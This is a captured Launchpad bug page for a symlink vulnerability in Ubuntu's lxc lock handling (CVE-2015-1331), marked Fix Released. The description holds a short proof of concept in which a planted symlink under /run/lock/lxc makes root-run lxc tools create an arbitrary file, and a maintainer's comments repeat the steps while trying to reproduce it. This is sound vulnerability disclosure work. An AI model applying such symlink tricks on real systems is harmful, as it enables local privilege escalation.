<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr">
  <head>
<base href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1470842/+index" />

    <meta charset="UTF-8" />
    <title>Bug #1470842 “lxc tools lock handling vulnerable to symlink atta...” : Bugs : lxc package : Ubuntu</title>
    <link rel="shortcut icon" href="/@@/launchpad.png" />
    <link rel="canonical" href="https://bugs.launchpad.net/bugs/1470842" />
    
      <link rel="alternate" type="application/atom+xml" href="http://feeds.launchpad.net/bugs/1470842/bug.atom" title="Bug 1470842 Feed" />
    

    
  
  <link type="text/css" rel="stylesheet" media="screen, print" href="/+icing/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/combo.css" />


    

    
      <meta name="description" content="During LXC security analysis (see [1]) it was found, that when lxc tools, e.g. lxc-info, are run as user root, a symlink attack on /run/lock/lxc can be used to create arbitrary files as the root user. The malicious user has to set up the symlink attack before /run/lock/lxc/ exists, which is only possible prior to the administrator creating the first container or automatic startup starting after boot starting one.

PoC:

$ mkdir -p /run/lock/lxc/var/lib/lxc
$ ln -s /test /run/lock/lxc/var/lib/..." />
      <meta property="og:description" content="During LXC security analysis (see [1]) it was found, that when lxc tools, e.g. lxc-info, are run as user root, a symlink attack on /run/lock/lxc can be used to create arbitrary files as the root user. The malicious user has to set up the symlink attack before /run/lock/lxc/ exists, which is only possible prior to the administrator creating the first container or automatic startup starting after boot starting one.

PoC:

$ mkdir -p /run/lock/lxc/var/lib/lxc
$ ln -s /test /run/lock/lxc/var/lib/..." />
    

    
    
      <meta property="og:title" content="Bug #1470842 “lxc tools lock handling vulnerable to symlink atta...” : Bugs : lxc package : Ubuntu" />
      <meta property="og:type" content="website" />
      <meta property="og:image" content="/@@/launchpad.png" />
      <meta property="og:url" content="https://bugs.launchpad.net/bugs/1470842" />
      <meta property="og:site_name" content="Launchpad" />
    

    

    
  

  
  
  <script type="text/javascript">
    var LP = {
        cache: {},
        links: {}
    };
  </script>

  

  <script type="text/javascript">var cookie_scope = '; Path=/; Secure; Domain=.launchpad.net';</script>

   <script type="text/javascript" src="/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?yui/yui/yui-min.js&amp;lp/meta.js&amp;yui/loader/loader-min.js"></script>
   <script type="text/javascript">
        var raw = null;
        if (LP.devmode) {
           raw = 'raw';
        }
        YUI.GlobalConfig = {
            combine: true,
            comboBase: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?',
            root: 'yui/',
            filter: raw,
            debug: false,
            fetchCSS: false,
            maxURLLength: 2000,
            groups: {
                lp: {
                    combine: true,
                    base: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?lp/',
                    comboBase: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?',
                    root: 'lp/',
                    // comes from including lp/meta.js
                    modules: LP_MODULES,
                    fetchCSS: false
                }
            }
        }</script>

  <script type="text/javascript">
      // we need this to create a single YUI instance all events and code
      // talks across. All instances of YUI().use should be based off of
      // LPJS instead.
      var LPJS = new YUI();
  </script>



    <script id="base-layout-load-scripts" type="text/javascript">
        //<![CDATA[
        LPJS.use('base', 'node', 'console', 'event',
            'oop', 'lp', 'lp.app.foldables','lp.app.sorttable',
            'lp.app.inlinehelp', 'lp.app.links',
            'lp.bugs.bugtask_index', 'lp.bugs.subscribers',
            'lp.app.ellipsis', 'lp.code.branchmergeproposal.diff',
            'lp.views.global',
             function(Y) {

            Y.on("domready", function () {
                var global_view = new Y.lp.views.Global();
                global_view.render();

                Y.lp.app.sorttable.SortTable.init();
                Y.lp.app.inlinehelp.init_help();
                Y.lp.activate_collapsibles();
                Y.lp.app.foldables.activate();
                Y.lp.app.links.check_valid_lp_links();
            });

            Y.on('lp:context:web_link:changed', function(e) {
                  window.location = e.new_value;
            });
        });
        //]]>
    </script>
    <script id="base-helper-functions" type="text/javascript">
         //<![CDATA[
        // This code is pulled from lp.js that needs to be available on every
        // request. Pulling here to get it outside the scope of the YUI block.
        function setFocusByName(name) {
            // Focus the first element matching the given name which can be focused.
            var nodes = document.getElementsByName(name);
            var i, node;
            for (i = 0; i < nodes.length; i++) {
                node = nodes[i];
                if (node.focus) {
                    try {
                        // Trying to focus a hidden element throws an error in IE8.
                        if (node.offsetHeight !== 0) {
                            node.focus();
                        }
                    } catch (e) {
                        LPJS.use('console', function(Y) {
                            Y.log('In setFocusByName(<' +
                                node.tagName + ' type=' + node.type + '>): ' + e);
                        });
                    }
                    break;
                }
            }
        }

        function selectWidget(widget_name, event) {
          if (event && (event.keyCode === 9 || event.keyCode === 13)) {
              // Avoid firing if user is tabbing through or simply pressing
              // enter to submit the form.
              return;
          }
          document.getElementById(widget_name).checked = true;
        }
        //]]>
    </script>

    
      
      <script type="text/javascript" id="available-official-tags-js">var available_official_tags = ["a11y", "appstream", "bionic", "bisect-done", "bitesize", "cherry-pick", "community-security", "desktop-file", "disco", "dist-upgrade", "focal", "ftbfs", "groovy", "hirsute", "hw-specific", "impish", "jammy", "kernel-bug", "manpage", "metabug", "multiarch", "needs-bisect", "needs-design", "needs-packaging", "needs-reassignment", "package-conflict", "packaging", "patch", "patch-accepted-debian", "patch-accepted-upstream", "patch-forwarded-debian", "patch-forwarded-upstream", "patch-needswork", "patch-rejected", "patch-rejected-debian", "patch-rejected-upstream", "performing-bisect", "py2-removal", "qt4-removal", "regression-proposed", "regression-release", "regression-update", "string-fix", "suspend-resume", "systemd-boot", "testcase", "touch", "unmetdeps", "upgrade-software-version", "verification-done-bionic", "verification-done-focal", "verification-done-groovy", "verification-done-hirsute", "verification-done-impish", "verification-done-xenial", "verification-failed-bionic", "verification-failed-groovy", "verification-failed-impish", "verification-failed-xenial", "verification-needed-bionic", "verification-needed-focal", "verification-needed-groovy", "verification-needed-hirsute", "verification-needed-impish", "verification-needed-trusty", "verification-needed-xenial", "wayland", "xenial"];</script>
      <script type="text/javascript">
        LPJS.use('base', 'node', 'oop', 'event', 'lp.bugs.bugtask_index',
                  'lp.bugs.subscribers', 'lp.code.branchmergeproposal.diff',
                  'lp.app.comment', 'lp.services.messages.edit', function(Y) {
            Y.on('domready', function() {
                Y.lp.code.branchmergeproposal.diff.connect_diff_links();
                Y.lp.bugs.bugtask_index.setup_bugtask_index();
                Y.lp.bugs.bugtask_index.setup_bugtask_table();
                LP.cache.comment_context = LP.cache.bug;
                var cl = new Y.lp.app.comment.CommentList();
                cl.render();
                var sl = new Y.lp.bugs.subscribers.createBugSubscribersLoader({
                    container_box: '#other-bug-subscribers',
                    subscribers_details_view:
                        '/+bug-portlet-subscribers-details',
                    subscribe_someone_else_link: '.menu-link-addsubscriber'
                }, window);

                Y.lp.services.messages.edit.setup();
            });
         });
      </script>
      <style type="text/css">
        /* Align the 'add comment' link to the right of the comment box. */
        #add-comment-form textarea { width: 100%; }
        #add-comment-form { max-width: 60em; padding-bottom: 4em; }
        #add-comment-form .actions {float: right;}
        .buglink-summary dd { font-size: 10px; }
        a#privacy-link:link:hover, a#privacy-link:visited:hover {text-decoration:none;}
      </style>
      <style type="text/css">
        .yui3-overlay .value label  {
          /* It normally makes sense for form labels to be bold, but since
          this form consists only of radio buttons, there's nothing but labels
          so we just get wall-to-wall bold. */
          font-weight: normal !important;
        }
      </style>
    
    
  </head>

  <body id="document" itemscope="" itemtype="http://schema.org/WebPage" class="tab-bugs
      main_side
      public
      yui3-skin-sam">
          
          
    <div class="yui-d0">
      <div id="locationbar" class="login-logout">
        

<div id="logincontrol"><a href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1470842/+login">Log in / Register</a></div>



      </div><!--id="locationbar"-->

      <div id="watermark" class="watermark-apps-portlet">
        <div>
          <a href="https://launchpad.net/ubuntu"><img alt="" width="64" height="64" src="https://launchpadlibrarian.net/49558155/64_logo.png" /></a>
        </div>
        <div class="wide">
          <h2 id="watermark-heading"><a href="https://launchpad.net/ubuntu">Ubuntu</a><br /><a href="https://launchpad.net/ubuntu/+source/lxc">lxc package</a></h2>
        </div>
        
  <!-- Application Menu -->
  <ul class="facetmenu">
    
      
      <li class="overview"><a href="https://launchpad.net/ubuntu/+source/lxc">Overview</a></li>
      
    
    
      
      <li class="branches"><a href="https://code.launchpad.net/ubuntu/+source/lxc">Code</a></li>
      
    
    
      <li class="bugs active"><a href="https://bugs.launchpad.net/ubuntu/+source/lxc">Bugs</a></li>
      
      
    
    
      
      
      <li class="specifications disabled-tab"><span>Blueprints</span></li>
    
    
      
      <li class="translations"><a href="https://translations.launchpad.net/ubuntu/+source/lxc">Translations</a></li>
      
    
    
      
      <li class="answers"><a href="https://answers.launchpad.net/ubuntu/+source/lxc">Answers</a></li>
      
    
  </ul>

      </div>

      <div class="yui-t4">
        <div id="maincontent" class="yui-main">
          <div class="yui-b" dir="ltr">
            <div class="context-publication">
              
      <h1 id="edit-title">
<span class="yui3-editable_text-text ellipsis" style="max-width: 95%;">
    lxc tools lock handling vulnerable to symlink attack
</span>
  
</h1>



    
              

              <div id="registration" class="registering">
                
      Bug #1470842 reported by
      <a href="https://launchpad.net/~roman-fiedler-deactivatedaccount" class="sprite person-inactive">Roman Fiedler</a>
      <time title="2015-07-02 12:46:33 UTC" datetime="2015-07-02T12:46:33.491657+00:00">on 2015-07-02</time>
    
              </div>
            </div>

            
            <div id="request-notifications">
              
            </div>

            
              <div>

      

      <div id="bug-is-duplicate">
          
      </div>
      

      <div style="float: right;">
        <span><a href="/+help-bugs/bug-heat.html" target="help" class="sprite flame">262</a></span>
      </div>

      


  
  
    <div class="actions">
      <span id="affectsmetoo" style="display: inline">This bug affects 1 person</span>
    </div>
  



    <table id="affected-software" class="listing">
      <thead>
        <tr>
          <th colspan="2">Affects</th>
          <th>Status</th>
          <th>Importance</th>
          <th>Assigned to</th>
          <th>Milestone</th>
        </tr>
      </thead>

      <tbody>
        
          
  <tr class="highlight" id="tasksummary1868490">
    <td>
      <a class="bugtask-expander" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1470842/+editstatus">
        &#8203;
      </a>
    </td>
    
    <td>
      <span id="bugtarget-picker-tasksummary1868490">
        <span class="yui3-activator-data-box">
            <a class="sprite package-source" href="https://bugs.launchpad.net/ubuntu/+source/lxc" title="Latest release: 1:4.0.10-0ubuntu5, uploaded to universe on 2021-09-24 14:31:08.843633+00:00 by Lukas Märdian (slyon), maintained by Ubuntu Developers (ubuntu-devel-discuss-lists)">lxc (Ubuntu)</a>
        </span>
        <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
          Edit
        </button>
        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        
      </span>
    </td>

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1470842/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
          <a href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1470842/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary1868490">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      <div class="milestone-content" style="width: 100%; float: left">
        
        <a class="value" href=""></a>
        
      </div>
    </td>

    
  </tr>

  
    <tr class="bugtask-collapsible-content hidden" id="task1868490">
     <td colspan="7"><form action="/ubuntu/+source/lxc/+bug/1470842/+editstatus" method="post" enctype="multipart/form-data">
  

  <p class="error message">
    You need to log in to change this bug's status.
  </p>
  
  <table class="summary" style="float: right; margin-left: 1em;">
    <tr>
      <th>Affecting:</th>
      <td><a href="/ubuntu/+source/lxc">lxc (Ubuntu)</a></td>
    </tr>
    <tr>
      <th>Filed here by:</th>
      <td><a href="https://launchpad.net/~roman-fiedler-deactivatedaccount" class="sprite person-inactive">Roman Fiedler</a></td>
    </tr>
    <tr>
      <th>When:</th>
      <td>
        <time title="2015-07-02 12:46:33 UTC" datetime="2015-07-02T12:46:33.491657+00:00">2015-07-02</time>
      </td>
    </tr>
    <tr>
      <th>Confirmed:</th>
      <td>
        <time title="2015-07-02 15:35:52 UTC" datetime="2015-07-02T15:35:52.163764+00:00">2015-07-02</time>
      </td>
    </tr>
    
    <tr>
      <th>Started work:</th>
      <td>
        <time title="2015-07-22 14:12:27 UTC" datetime="2015-07-22T14:12:27.789092+00:00">2015-07-22</time>
      </td>
    </tr>
    <tr>
      <th>Completed:</th>
      <td>
        <time title="2015-07-22 14:12:27 UTC" datetime="2015-07-22T14:12:27.789092+00:00">2015-07-22</time>
      </td>
    </tr>
  </table>
  <div class="field">
    <table>
      <tr>
        <td>
          <label for="ubuntu_lxc.target">Target</label>
        </td>
      </tr>
      <tr>
        <td>
          <table>
  <tr>
    <td>
      <label>
        <input class="radioType" checked="checked" id="ubuntu_lxc.target.option.package" name="ubuntu_lxc.target" type="radio" value="package" />
        Distribution
      </label>
    </td>
    <td>
      <select id="ubuntu_lxc.target.distribution" name="ubuntu_lxc.target.distribution" size="1" >
<option value="baltix">Baltix</option>
<option value="boss">BOSS</option>
<option value="charms">Juju Charms Collection</option>
<option value="elbuntu">Elbuntu</option>
<option value="guadalinex">Guadalinex</option>
<option value="guadalinexedu">Guadalinex Edu</option>
<option value="kiwilinux">Kiwi Linux</option>
<option value="nubuntu">nUbuntu</option>
<option value="pld-linux">PLD Linux</option>
<option value="tilix">Tilix</option>
<option value="tuxlab">tuXlab</option>
<option selected="selected" value="ubuntu">Ubuntu</option>
<option value="ubuntu-leb">Ubuntu Linaro Evaluation Build</option>
<option value="ubuntu-rtm">Ubuntu RTM</option>
</select>
<input name="ubuntu_lxc.target.distribution-empty-marker" type="hidden" value="1" />
    </td>
  </tr>
  <tr>
    <td align="right">
      <label for="ubuntu_lxc.target.option.package">
        Package
      </label>
    </td>
    <td>
      


    <input type="text" value="lxc" id="ubuntu_lxc.target.package"
                         name="ubuntu_lxc.target.package" size="20"
                         maxlength=""
                         onKeyPress="selectWidget(&#x27;ubuntu_lxc.target.option.package&#x27;, event)" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('ubuntu_lxc.target.package');
              var select_menu = Y.DOM.byId('ubuntu_lxc.target.package-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-ubuntu_lxc-target-package" href="#">Find&hellip;</a>)</span>
    <script>
    LPJS.use('node', 'lp.app.picker', function(Y) {
        var config = {"show_assign_me_button": false, "extra_no_results_message": null, "picker_type": "default", "selected_value_metadata": null, "remove_team_text": "Remove team", "selected_value": "lxc", "step_title": "Search by name", "header": "Select a package", "vocabulary_filters": [], "show_create_team": false, "input_element": "ubuntu_lxc.target.package", "assign_me_text": "Pick me", "remove_person_text": "Remove person", "show_remove_button": false, "vocabulary_name": "DistributionPackage", "show_widget_id": "show-widget-ubuntu_lxc-target-package"};
        var show_widget_id = 'show-widget-ubuntu_lxc-target-package';
        Y.lp.app.picker.addPicker(config, show_widget_id);
    });
    </script>
  



    </td>
  </tr>

  <tr>
    <td>
      <label>
        <input class="radioType" id="ubuntu_lxc.target.option.product" name="ubuntu_lxc.target" type="radio" value="product" />
       Project
      </label>
    </td>
    <td>
      


    <input type="text" value="" id="ubuntu_lxc.target.product"
                         name="ubuntu_lxc.target.product" size="20"
                         maxlength=""
                         onKeyPress="selectWidget(&#x27;ubuntu_lxc.target.option.product&#x27;, event)" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('ubuntu_lxc.target.product');
              var select_menu = Y.DOM.byId('ubuntu_lxc.target.product-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-ubuntu_lxc-target-product" href="#">Find&hellip;</a>)</span>
    <script>
    LPJS.use('node', 'lp.app.picker', function(Y) {
        var config = {"show_assign_me_button": false, "extra_no_results_message": null, "picker_type": "default", "selected_value_metadata": null, "remove_team_text": "Remove team", "selected_value": null, "step_title": "Search", "header": "Select a project", "vocabulary_filters": [], "show_create_team": false, "input_element": "ubuntu_lxc.target.product", "assign_me_text": "Pick me", "remove_person_text": "Remove person", "show_remove_button": false, "vocabulary_name": "Product", "show_widget_id": "show-widget-ubuntu_lxc-target-product"};
        var show_widget_id = 'show-widget-ubuntu_lxc-target-product';
        Y.lp.app.picker.addPicker(config, show_widget_id);
    });
    </script>
  



    </td>
  </tr>
</table>

          
        </td>
      </tr>
    </table>
    
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="ubuntu_lxc.status">Status</label>
        </td>
        <td>
          <label style="font-weight: bold" for="ubuntu_lxc.importance">Importance</label>
        </td>
        
      </tr>
      <tr>
        <td><div>
<div class="value">
<select id="ubuntu_lxc.status" name="ubuntu_lxc.status" size="1" >
<option selected="selected" value="Fix Released">Fix Released</option>
</select>
</div>
<input name="ubuntu_lxc.status-empty-marker" type="hidden" value="1" />
</div></td>
        <td title="Changeable only by a project maintainer or bug supervisor">
          <span class="sprite read-only"></span>
          <span class="importanceUNDECIDED">Undecided</span>
        </td>
        
      </tr>
    </table>
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="ubuntu_lxc.assignee">Assigned to</label>
        </td>
      </tr>
      <tr>
        <td colspan="2" style="white-space: nowrap">

  <table>
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" checked="checked" id="ubuntu_lxc.assignee.assign_to_nobody" name="ubuntu_lxc.assignee.option" value="ubuntu_lxc.assignee.assign_to_nobody" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="ubuntu_lxc.assignee.assign_to_nobody">
          Nobody
        </label>
      </td>
    </tr>
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" id="ubuntu_lxc.assignee.assign_to_me" name="ubuntu_lxc.assignee.option" value="ubuntu_lxc.assignee.assign_to_me" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="ubuntu_lxc.assignee.assign_to_me">
          Me
        </label>
      </td>
    </tr>
    
    
  </table>


</td>
      </tr>
    </table>
    
  </div>
  <div class="field">
    <div>
      <label style="font-weight: bold" for="ubuntu_lxc.comment_on_change">Comment on this change (optional)</label>
      <textarea cols="62" rows="4" id="ubuntu_lxc.comment_on_change" name="ubuntu_lxc.comment_on_change"></textarea>
    </div>
    <div>
      <label style="font-weight: normal">
        <input type="checkbox" name="subscribe" id="subscribe" value="Subscribe" />
        Email me about changes to this bug report
      </label>
    </div>
  </div>
  
</form>
</td>
    </tr>
  


        
      </tbody>

    </table>



<div class="actions">
  
    <span id="also-affects-product" class="">
    <a class="menu-link-addupstream sprite add" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1470842/+choose-affected-product">Also affects project</a>
        <a href="/+help-bugs/also-affects-project-help.html" target="help" class="sprite maybe action-icon">(?)</a>
    </span>
    <span id="also-affects-package" class="">
    <a class="menu-link-adddistro sprite add" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1470842/+distrotask">Also affects distribution/package</a>
    </span>
    <a class="menu-link-nominate sprite milestone" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1470842/+nominate">Nominate for series</a>
    
  

</div>




      <div id="maincontentsub">
        <div class="top-portlet">

      <div itemprop="mainContentOfPage" class="report">
        

        <div>
  <div class="lazr-multiline-edit" id="edit-description">
  <div class="clearfix">
    

    <h3>Bug Description</h3>
  </div>

  <div class="yui3-editable_text-text"><p>During LXC security analysis (see [1]) it was found, that when lxc tools, e.g. lxc-info, are run as user root, a symlink attack on /run/lock/lxc can be used to create arbitrary files as the root user. The malicious user has to set up the symlink attack before /run/lock/lxc/ exists, which is only possible prior to the administrator creating the first container or automatic startup starting after boot starting one.</p>
<p>PoC:</p>
<p>$ mkdir -p /run/lock/<wbr />lxc/var/<wbr />lib/lxc<br />
$ ln -s /test /run/lock/<wbr />lxc/var/<wbr />lib/lxc/<wbr />somename<br />
$ stat /test<br />
stat: cannot stat ‘/test’: No such file or directory<br />
$ sudo lxc-create --name somename --template download # An admin would run this command<br />
...<br />
Distribution: ubuntu<br />
Release: trusty<br />
Architecture: amd64<br />
...<br />
$ stat /test<br />
&nbsp;&nbsp;File: ‘/test’<br />
&nbsp;&nbsp;Size: 0         	Blocks: 0          IO Block: 4096   regular empty file<br />
Device: fd01h/64769d	Inode: 52559       Links: 1<br />
Access: (0600/-rw-------)  Uid: (    0/    root)   Gid: (    0/    root)<br />
Access: 2015-07-02 10:40:55.703646793 -0500<br />
Modify: 2015-07-02 10:40:55.703646793 -0500<br />
Change: 2015-07-02 10:40:55.703646793 -0500<br />
&nbsp;Birth: -</p>
<p># lsb_release -rd<br />
Description:    Ubuntu 14.04.2 LTS<br />
Release:        14.04</p>
<p># apt-cache policy lxc<br />
lxc:<br />
&nbsp;&nbsp;Installed: 1.0.7-0ubuntu0.1<br />
&nbsp;&nbsp;Candidate: 1.0.7-0ubuntu0.1<br />
&nbsp;&nbsp;Version table:<br />
&nbsp;*** 1.0.7-0ubuntu0.1 0<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;500 <a rel="nofollow" href="http://archivexxx/ubuntu/">http://<wbr />archivexxx/<wbr />ubuntu/</a> trusty-updates/main amd64 Packages<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100 /var/lib/<wbr />dpkg/status<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.0.3-0ubuntu3 0<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;500 <a rel="nofollow" href="http://archivexxx/ubuntu/">http://<wbr />archivexxx/<wbr />ubuntu/</a> trusty/main amd64 Packages</p>
<p>[1] <a rel="nofollow" href="https://service.ait.ac.at/security/2015/LxcSecurityAnalysis.html">https:/<wbr />/service.<wbr />ait.ac.<wbr />at/security/<wbr />2015/LxcSecurit<wbr />yAnalysis.<wbr />html</a></p></div>
  </div>

  
</div>


        <div style="margin:-10px 0 20px 5px" class="clearfix">
          <span>See <a href="comments/0">original description</a></span>
        </div>

        <div id="bug-tags">
          <span id="tags-heading">
            
          </span>
          <span id="tag-list">
          </span>
          <a href="+edit" title="Add tags" id="tags-trigger" class="sprite add">Add tags</a>
          
          <a href="/+help-bugs/tag-help.html" target="help" class="sprite maybe action-icon">Tag help</a>
        </div>

        <script type="text/javascript">
          LPJS.use('event', 'node', 'lp.bugs.tags_entry', function(Y) {
              Y.on('domready',
                   function(e) {
                       Y.lp.bugs.tags_entry.setup_tag_entry(
                           available_official_tags);
                   },
                   window);
          });
        </script>

        <div class="clearfix"></div>
      </div>

      <div id="branches-and-cves">
        <div id="bug-branches-container" style="float: left">
          
        </div><!-- bug-branch-container -->

        <div class="cves">
          <h2>CVE References</h2>
          <ul>
            <li class="sprite cve">
              <a href="/bugs/cve/2015-1331" title="lxclock.c in LXC 1.1.2 and earlier al...">2015-1331</a>
            </li>
          </ul>
        </div>

        <div class="clearfix"></div>
      </div> <!-- branches and CVEs -->

      </div>

      <div>
      
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1470842/comments/1" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-02T15:11:14.437456+00:00" title="2015-07-02 15:11:14 UTC">on 2015-07-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1470842/comments/1"> #1</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Hi Roman - Thank you for the report!</p>
<p>Unfortunately, I&#x27;m having trouble reproducing the issue. You say that guest &quot;somename&quot; has to exist but if a privilege LXC container has been created, /run/lock/lxc always exists. That directory and its subdirectories are only modifiable by root and they&#x27;re created during the boot process.</p>
<p>I&#x27;ll now try creating the malicious /run/lock/<wbr />lxc/var/<wbr />lib/lxc/<wbr />somename before creating the &quot;somename&quot; container since /run/lock/lxc will not yet exist.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Hi Roman - Thank you for the report!

Unfortunately, I'm having trouble reproducing the issue. You say that guest "somename" has to exist but if a privilege LXC container has been created, /run/lock/lxc always exists. That directory and its subdirectories are only modifiable by root and they're created during the boot process.

I'll now try creating the malicious /run/lock/lxc/var/lib/lxc/somename before creating the "somename" container since /run/lock/lxc will not yet exist.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1470842/comments/2" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-02T15:28:35.214059+00:00" title="2015-07-02 15:28:35 UTC">on 2015-07-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1470842/comments/2"> #2</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I cannot reproduce the issue. Here is a log of the commands that I ran:</p>
<p>$ echo UNTRUNCATED | sudo tee /test<br />
UNTRUNCATED<br />
$ mkdir -p /run/lock/<wbr />lxc/var/<wbr />lib/lxc<br />
$ ln -s /test /run/lock/<wbr />lxc/var/<wbr />lib/lxc/<wbr />somename<br />
$ ls -al /run/lock/<wbr />lxc/var/<wbr />lib/lxc/<br />
total 0<br />
drwxrwxr-x 2 tyhicks tyhicks 60 Jul  2 10:21 .<br />
drwxrwxr-x 3 tyhicks tyhicks 60 Jul  2 10:21 ..<br />
lrwxrwxrwx 1 tyhicks tyhicks  5 Jul  2 10:21 somename -&gt; /test<br />
$ sudo lxc-create --name somename --template download<br />
...<br />
Distribution: ubuntu<br />
Release: trusty<br />
Architecture: amd64<br />
...<br />
$ ls -al /run/lock/<wbr />lxc/var/<wbr />lib/lxc/<br />
total 0<br />
drwxrwxr-x 2 tyhicks tyhicks 60 Jul  2 10:21 .<br />
drwxrwxr-x 3 tyhicks tyhicks 60 Jul  2 10:21 ..<br />
lrwxrwxrwx 1 tyhicks tyhicks  5 Jul  2 10:21 somename -&gt; /test<br />
$ cat /test<br />
UNTRUNCATED<br />
$ sudo lxc-info --name somename<br />
Name:           somename<br />
State:          STOPPED<br />
$ ls -al /run/lock/<wbr />lxc/var/<wbr />lib/lxc/<br />
total 0<br />
drwxrwxr-x 2 tyhicks tyhicks 60 Jul  2 10:21 .<br />
drwxrwxr-x 3 tyhicks tyhicks 60 Jul  2 10:21 ..<br />
lrwxrwxrwx 1 tyhicks tyhicks  5 Jul  2 10:21 somename -&gt; /test<br />
$ cat /test<br />
UNTRUNCATED</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I cannot reproduce the issue. Here is a log of the commands that I ran:

$ echo UNTRUNCATED | sudo tee /test
UNTRUNCATED
$ mkdir -p /run/lock/lxc/var/lib/lxc
$ ln -s /test /run/lock/lxc/var/lib/lxc/somename
